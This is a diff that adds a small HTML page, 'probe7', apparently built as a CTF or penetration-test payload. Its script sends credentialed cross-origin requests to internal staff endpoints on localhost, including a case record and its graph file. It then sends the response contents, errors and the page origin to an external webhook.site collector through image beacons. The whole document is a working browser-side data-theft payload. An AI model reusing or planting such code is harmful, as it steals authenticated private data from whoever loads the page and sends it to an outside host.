@@ -1,0 +1,28 @@
+<!doctype html><html><head><title>probe7</title></head><body>probe7
+<script>
+var H="https://webhook.site/4b355a3b-6bd1-4a29-a69e-8f84325671d6";
+function b(k,v){try{var i=new Image();i.src=H+"/r?k="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).slice(0,700));}catch(e){}}
+function go(name,fn){try{fn().then(function(v){b(name,v)},function(e){b(name+"_ERR",(e&&e.name)+":"+(e&&e.message))})}catch(e){b(name+"_THROW",e.message)}}
+b("start","origin="+location.origin);
+go("graph_cors",async function(){
+  var r=await fetch("https://127.0.0.1:8443/staff/cases/BT-017/graph.mjs",{credentials:"include",mode:"cors",cache:"no-store"});
+  var t=await r.text();
+  return r.status+"|"+t.slice(0,600);
+});
+go("case_cors",async function(){
+  var r=await fetch("https://127.0.0.1:8443/staff/cases/BT-017",{credentials:"include",mode:"cors",cache:"no-store"});
+  var t=await r.text();
+  return r.status+"|len="+t.length+"|"+t.slice(0,100);
+});
+go("graph_nocors",async function(){
+  var r=await fetch("https://127.0.0.1:8443/staff/cases/BT-017/graph.mjs",{credentials:"include",mode:"no-cors",cache:"no-store"});
+  return r.type+":"+r.status;
+});
+go("pub1337",async function(){
+  var r=await fetch("http://127.0.0.1:1337/api/public/overview",{mode:"cors"});
+  return r.status+"|"+(await r.text()).slice(0,120);
+});
+go("graph_img",async function(){
+  return new Promise(function(res){var i=new Image();i.onload=function(){res("LOADED")};i.onerror=function(){res("ERROR")};i.src="https://127.0.0.1:8443/staff/cases/BT-017/graph.mjs";});
+});
+</script></body></html>
